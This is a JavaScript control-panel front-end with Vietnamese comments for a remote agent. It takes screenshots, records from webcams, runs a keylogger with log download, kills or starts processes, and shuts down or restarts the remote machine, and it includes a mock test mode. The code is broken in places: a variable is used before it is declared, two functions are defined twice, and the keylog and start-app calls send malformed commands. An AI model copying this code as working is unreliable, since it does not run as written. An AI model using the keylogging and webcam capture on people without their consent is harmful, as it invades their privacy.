// ================================================================
// CẤU HÌNH KẾT NỐI
// ================================================================
const WS_URL = "ws://" + window.location.host + "/control";
let socket;
let isConnected = false;
let isSystemCommandSent = false; // Cờ đánh dấu để đổi icon khi Shutdown/Restart

// CÁC PHẦN TỬ GIAO DIỆN
const imgScreen = document.getElementById('imgResult');
const textLog = document.getElementById('textResult');
const listScreen = document.getElementById('listResult');
const keylogScreen = document.getElementById('keylogResult');
const statusBox = document.getElementById('connectionStatus');
const loadingScreen = document.getElementById('loadingSpinner');

// BIẾN TẠM
let keylogBuffer = "";
let lastBlob = null;
let lastFileName = "";
let lastObjectUrl = null;

// ÂM THANH
const soundClick = new Audio('https://www.myinstants.com/media/sounds/among-us-chat-sound.mp3');
const soundError = new Audio('https://www.myinstants.com/media/sounds/among-us-error.mp3');

function playSound(type) {
    if (type === 'click') {
        soundClick.currentTime = 0;
        soundClick.play().catch(e => { });
    } else if (type === 'error') {
        soundError.play().catch(e => { });
    }
}

// ================================================================
// 1. QUẢN LÝ KẾT NỐI SOCKET
// ================================================================
function connectToServer() {
    if (isConnected) {
        showToast("Máy đã kết nối rồi!");
        return;
    }

    playSound('click');

    // Trạng thái Đang kết nối
    statusBox.classList.remove("alert-danger", "alert-success", "alert-warning");
    statusBox.classList.add("alert-connecting");
    statusBox.innerHTML = `<i class="fas fa-satellite-dish fa-spin"></i> ĐANG KẾT NỐI...`;

    setTimeout(() => {
        try {
            socket = new WebSocket(WS_URL);

            // --- SỰ KIỆN 1: KHI MỞ KẾT NỐI ---
            socket.onopen = function (e) {
                isConnected = true;
                isSystemCommandSent = false;
                statusBox.classList.remove("alert-connecting");
                updateStatus('<i class="fas fa-wifi"></i> ĐÃ KẾT NỐI', "alert-warning", "alert-success");
                showToast("Kết nối thành công!");
                console.log(">> Đã kết nối tới Server!");
            };

            // --- SỰ KIỆN 2: KHI NHẬN DỮ LIỆU (BẠN ĐANG THIẾU ĐOẠN NÀY) ---
            socket.onmessage = function (event) {
                const data = JSON.parse(event.data);
                if (loadingScreen) loadingScreen.style.display = "none";
                processData(data); // Đưa dữ liệu sang hàm xử lý hiển thị
            };

            // --- SỰ KIỆN 3: KHI ĐÓNG KẾT NỐI ---
            socket.onclose = function (event) {
                isConnected = false;
                statusBox.classList.remove("alert-connecting");
                resetSystemButtons();

                if (isSystemCommandSent) {
                    updateStatus('<i class="fas fa-power-off"></i> HỆ THỐNG ĐÃ TẮT', "alert-success", "alert-danger");
                } else {
                    updateStatus('<i class="fas fa-exclamation-triangle"></i> MẤT KẾT NỐI', "alert-success", "alert-danger");
                }
                isSystemCommandSent = false;
            };

            // --- SỰ KIỆN 4: KHI CÓ LỖI ---
            socket.onerror = function (error) {
                isConnected = false;
                statusBox.classList.remove("alert-connecting");
                updateStatus('<i class="fas fa-bomb"></i> LỖI KẾT NỐI', "alert-success", "alert-danger");
            };

        } catch (err) {
            statusBox.classList.remove("alert-connecting");
            updateStatus('<i class="fas fa-bug"></i> LỖI URL', "alert-success", "alert-danger");
            console.error("Lỗi khởi tạo Socket:", err);
        }
    }, 500);
}
function updateStatus(msg, removeClass, addClass) {
    statusBox.innerHTML = msg;
    statusBox.classList.remove(removeClass);
    statusBox.classList.add(addClass);
}

// ================================================================
// 2. XỬ LÝ DỮ LIỆU (Cập nhật Mã 4 & Ô Keylog riêng)
// ================================================================
function processData(data) {
    if (loadingScreen) loadingScreen.style.display = "none";
    hideAllScreens();

    // --- BỔ SUNG TRƯỜNG HỢP NÀY ---
    if (data.Name === "WebcamList") {
        const select = document.getElementById("webcamSelect");
        const recordBtn = document.getElementById("btnWebcamRecord");

        if (select && data.Data) {
            select.innerHTML = ""; // Xóa danh sách cũ
            data.Data.forEach(camName => {
                let opt = document.createElement("option");
                opt.value = camName; // Agent thường dùng tên hoặc ID
                opt.text = "📷 " + camName;
                select.appendChild(opt);
            });
            // Hiện danh sách chọn và nút Quay clip
            select.style.display = "block";
            if (recordBtn) recordBtn.style.display = "block";
            showToast("Đã tìm thấy " + data.Data.length + " Camera!");
        }
    }
    // --- CÁC TRƯỜNG HỢP CŨ GIỮ NGUYÊN ---
    else if (data.Name === "ScreenshotResponse") {
        imgScreen.style.display = "block";
        imgScreen.src = "data:image/jpeg;base64," + data.Data;
    }
    else if (data.Name === "WebcamRecord") {
        videoScreen.style.display = "block";
        videoScreen.src = "data:video/mp4;base64," + data.Data;
        videoScreen.play();
        const videoScreen = document.getElementById("videoResult");
    }
    else if (
        data.Name === "TaskList" ||
        data.Name === "InstalledAppList" ||
        data.Name === "RunningAppList"
    ) {
        listScreen.style.display = "block"; // Đảm bảo listResult hiện ra
        renderAppList(data.Data);
    }
    else if (data.Name === "KeyloggerData") {
        keylogScreen.style.display = "block";
        keylogScreen.innerText += data.Data;
        keylogBuffer += data.Data;
    }
}
// ================================================================
// 3. GỬI LỆNH & GIAO DIỆN
// ================================================================
function sendCommand(cmdInput, dataParam = "") {
    let payload = {};

    if (typeof cmdInput === "string") {
        payload.Name = cmdInput;
    } else if (typeof cmdInput === "object") {
        payload.Name = cmdInput.Name || cmdInput.command;
        payload.Data = cmdInput.Data || dataParam;
    }

    // Ánh xạ tên lệnh cũ sang chuẩn JSON mới
    const mapping = {
        "GET_SCREENSHOT": "Screenshot",
        "GET_APPS": "ListInstalledApp",
        "GET_PROCESSES": "ListTask",
        "START_APP": "StartApp",
        "STOP_APP": "StopApp"
    };
    if (mapping[payload.Name]) payload.Name = mapping[payload.Name];

    // CỐ ĐỊNH: Riêng StopTask phải gửi Data là Object { ID: ... }
    if (payload.Name === "StopTask" && typeof payload.Data !== "object") {
        payload.Data = { ID: parseInt(payload.Data) };
    }

    // 4. Xử lý TEST_MODE hoặc gửi thật
    if (TEST_MODE) {
        simulateTestResponse(payload);
        return;
    }

    if (socket && isConnected) {
        socket.send(JSON.stringify(payload));
        showLoading();
    }
}

// Tạo Alias để các nút cũ gọi guiLenh() vẫn hoạt động
function guiLenh(cmd, data) { sendCommand(cmd, data); }// Hàm gỡ bỏ trạng thái loading của nút (Fix lỗi kẹt chữ)
function resetSystemButtons() {
    const btnR = document.getElementById('btnRestart');
    const btnS = document.getElementById('btnShutdown');
    if (btnR) {
        btnR.classList.remove('loading');
        btnR.innerHTML = `<i class="fas fa-sync-alt"></i> RESTART`;
    }
    if (btnS) {
        btnS.classList.remove('loading');
        btnS.innerHTML = `<i class="fas fa-power-off"></i> SHUTDOWN`;
    }
}

function renderAppList(list) {
    // Bao bọc danh sách trong container chuẩn của bạn
    listScreen.innerHTML = `<div class="list-container"></div>`;
    const container = listScreen.querySelector('.list-container');

    if (!list || list.length === 0) {
        container.innerHTML = "<div class='text-center'>DỮ LIỆU TRỐNG...</div>";
        return;
    }

    list.forEach(item => {
        let id = item.pid || item.Id || item.ID || 0;
        let name = item.Name || item.name;
        let isRunning = id > 0; // Xác định trạng thái để hiện nút tương ứng
        container.innerHTML += `
            <div class="list-item">
                <div style="display: flex; align-items: center; gap: 10px;">
                    <i class="fas fa-user-astronaut"></i> 
                    <span>${name}</span>
                </div>
                <div style="font-size: 22px; opacity: 0.8;">
                    PID: ${id || '---'}
                </div>
                <div class="list-actions">
                    ${isRunning
                ? `<button class="btn-stop btn-among-us" onclick="handleStopApp(this, ${id})">STOP</button>`
                : `<button class="btn-start btn-among-us" onclick="guiLenh('StartTask', '${name}')">START</button>`}
                </div>
            </div>`;
    });
} function handleStopApp(btn, pid) {

    const item = btn.closest('.list-item');
    if (item) item.style.opacity = "0.5";

    btn.innerHTML = `<i class="fas fa-spinner fa-spin"></i>`;

    sendCommand("StopTask", { ID: pid });
}

function hideAllScreens() {
    const screens = [imgScreen, textLog, listScreen, keylogScreen, loadingScreen];
    screens.forEach(s => { if (s) s.style.display = "none"; });
    const video = document.getElementById("videoResult");
    if (video) { video.pause(); video.style.display = "none"; }
}

function showLoading() {
    hideAllScreens();
    if (loadingScreen) {
        loadingScreen.style.display = "flex";
        loadingScreen.style.flexDirection = "column";
        loadingScreen.style.justifyContent = "center";
        loadingScreen.style.alignItems = "center";
        loadingScreen.style.height = "100%";
    }
}

// --- TIỆN ÍCH KHÁC ---
function highlightButton(activeBtnId) {
    playSound('click');
    const buttons = ["btnScreenshot", "btnGetWebcams", "btnKeylog", "btnListApps", "btnListProcesses"];
    buttons.forEach(id => {
        const btn = document.getElementById(id);
        if (btn) btn.classList.remove("btn-active");
    });
    const targetBtn = document.getElementById(activeBtnId);
    if (targetBtn) targetBtn.classList.add("btn-active");
}

function showToast(message, isError = false) {
    const box = document.getElementById("toast-box");
    if (!box) return;

    const toast = document.createElement("div");
    toast.classList.add("toast-msg");

    // Nếu là lỗi thì đổi màu viền sang Đỏ (Red)
    if (isError) {
        toast.style.borderColor = "#ff0000";
        toast.style.boxShadow = "0 4px 15px rgba(255, 0, 0, 0.3)";
    }

    // Icon tên lửa hoặc cảnh báo
    const icon = isError ? "⚠️" : "🚀";

    toast.innerHTML = `<span>${icon}</span> <span>${message}</span>`;

    box.appendChild(toast);

    // Tự động xóa sau 3 giây
    setTimeout(() => {
        toast.style.animation = "fadeOut 0.5s forwards";
        setTimeout(() => toast.remove(), 500);
    }, 3000);
}
function downloadKeylog() {
    if (!keylogBuffer || keylogBuffer.trim() === "") {
        showToast("Chưa có dữ liệu log để tải!", true);
        return;
    }
    const blob = new Blob([keylogBuffer], { type: 'text/plain' });
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = `Keylog_${new Date().getTime()}.txt`;
    link.click();
    showToast("Đã tải xuống file log!");
}

function saveFile() {
    if (!lastBlob) { showToast("Chưa có dữ liệu!"); return; }
    const a = document.createElement("a");
    a.href = URL.createObjectURL(lastBlob);
    a.download = lastFileName;
    a.click();
}

function startAppByName() {
    const appName = document.getElementById("appNameInput").value.trim();
    if (!appName) { showToast("Vui lòng nhập tên app!"); return; }
    sendCommand({
        Name: "StartTask",
        Data: { Path: appName }
    });

    showToast(`Đang khởi chạy: ${appName}`);
}

// HIỆU ỨNG SÓNG (RIPPLE) KHI CLICK NÚT
document.addEventListener('click', function (e) {
    const target = e.target.closest('.btn-among-us');
    if (target) {
        const circle = document.createElement('span');
        const diameter = Math.max(target.clientWidth, target.clientHeight);
        circle.style.width = circle.style.height = `${diameter}px`;
        const rect = target.getBoundingClientRect();
        circle.style.left = `${e.clientX - rect.left - diameter / 2}px`;
        circle.style.top = `${e.clientY - rect.top - diameter / 2}px`;
        circle.classList.add('ripple');
        target.appendChild(circle);
        setTimeout(() => circle.remove(), 600);
    }
});









let TEST_MODE = true;
function toggleTestMode() {
    TEST_MODE = !TEST_MODE;

    if (TEST_MODE) {
        showToast("TEST MODE: ON (Không cần WebSocket)");
        statusBox.innerHTML = `<i class="fas fa-vial"></i> TEST MODE`;
        statusBox.classList.remove("alert-danger", "alert-success", "alert-warning");
        statusBox.classList.add("alert-warning");
    } else {
        showToast("TEST MODE: OFF");
        statusBox.innerHTML = `<i class="fas fa-plug"></i> KẾT NỐI`;
        statusBox.classList.remove("alert-warning");
    }
}




// Thêm từ khóa async để xử lý fetch file ảnh/video thành Blob
async function simulateTestResponse(cmd) {
    hideAllScreens();

    // 1. Lấy tên lệnh từ trường 'Name' thay vì 'command'
    const commandName = cmd.Name;

    switch (commandName) {
        case "Screenshot": // Sửa từ GET_SCREENSHOT
            imgScreen.style.display = "block";
            // Giả lập đường dẫn ảnh test trong thư mục wwwroot/images
            imgScreen.src = "images/test.jpg";

            lastFileName = "screenshot_test.jpg";
            try {
                const response = await fetch("images/test.jpg");
                lastBlob = await response.blob();
                showToast("MOCK: Đã chụp màn hình (Test Mode)");
            } catch (e) { console.warn("Thiếu file images/test.jpg"); }
            break;

        case "WebcamRecord":
            const video = document.getElementById("videoResult");
            video.style.display = "block";
            video.src = "images/test.mp4"; // Đảm bảo file này tồn tại trong wwwroot/images/
            video.load();
            video.play();
            showToast("MOCK: Đang phát clip Webcam giả lập (10s)");
            break;

        case "KeyLogger": // Sửa từ GET_KEYLOG
            keylogScreen.style.display = "block";
            const mockKey = `\n[${new Date().toLocaleTimeString()}] Phím: "Among_Us_2025"`;
            keylogScreen.innerText += mockKey;
            keylogBuffer += mockKey;
            keylogScreen.scrollTop = keylogScreen.scrollHeight;
            showToast("MOCK: Đang bắt phím...");
            break;

        case "ListInstalledApp":
        case "ListTask":
            listScreen.style.display = "block";
            const mockData = [
                { Name: "Chrome.exe", Id: 1024 }, // Có PID -> Hiện STOP
                { Name: "AmongUs.exe", Id: 999 },  // Có PID -> Hiện STOP
                { Name: "Discord.exe", Id: 0 },    // PID = 0 -> Hiện START
                { Name: "Notepad.exe", Id: 0 }     // PID = 0 -> Hiện START
            ];
            renderAppList(mockData);
            showToast("MOCK: Đã tải danh sách test");
            break;

        case "StopTask": // Sửa từ STOP_APP
            const targetId = cmd.Data?.ID || "N/A";
            showToast(`MOCK: Đang dừng PID ${targetId}...`);
            setTimeout(() => {
                showToast("✔️ Thành công: Tiến trình đã đóng");
                simulateTestResponse({ Name: "ListTask" }); // Refresh lại danh sách
            }, 1000);
            break;

        case "Restart":
        case "Shutdown": // Khớp mục 4.1, 4.2
            showToast(`MOCK: Đang thực hiện ${commandName}...`);
            setTimeout(() => {
                resetSystemButtons();
                showToast(`✔️ Máy Agent đang ${commandName.toLowerCase()}...`);
            }, 2000);
            break;
        case "WebcamList": // Giả lập nhận danh sách Camera
            // Gọi trực tiếp hàm xử lý dữ liệu để hiện UI chọn Camera
            processData({
                Name: "WebcamList",
                Data: ["Integrated Webcam", "OBS Virtual Camera", "DroidCam Source 3"]
            });
            showToast("MOCK: Đã tìm thấy 3 Camera");
            break;

        default:
            showToast(`Lệnh [${commandName}] chưa hỗ trợ giả lập!`, true);
    }
}
// Hàm quay Webcam
function recordWebcam() {
    const id = document.getElementById("webcamSelect").value;
    if (id) {
        guiLenh("WebcamRecord", id); // Gửi ID camera
        showToast("Đang yêu cầu quay clip 10s...");
    } else {
        showToast("Vui lòng tìm và chọn Camera!", true);
    }
}

function startAppByName() {
    const name = document.getElementById("appNameInput").value.trim();
    if (name) {
        sendCommand({ Command: "StartTask", Data: { Path: appName } });
        showToast(`Đang khởi chạy: ${name}`);
    } else {
        showToast("Chưa nhập tên ứng dụng!", true);
    }
}

document.addEventListener("DOMContentLoaded", function () {
    // Chụp màn hình
    document.getElementById("btnScreenshot").onclick = () => { highlightButton('btnScreenshot'); guiLenh("Screenshot"); };
    // Xem ứng dụng và tác vụ
    document.getElementById("btnListApps").onclick = () => { highlightButton('btnListApps'); guiLenh("ListInstalledApp"); };
    document.getElementById("btnListProcesses").onclick = () => { highlightButton('btnListProcesses'); guiLenh("ListTask"); };
    // Nút Keylog
    document.getElementById("btnKeylog").onclick = () => { highlightButton('btnKeylog'); sendCommand({ Message: "KeyLogger" }); };
});

// Tạo "bí danh" để không phải sửa tên hàm trong HTML
function guiLenh(cmd, data) { sendCommand(cmd, data); }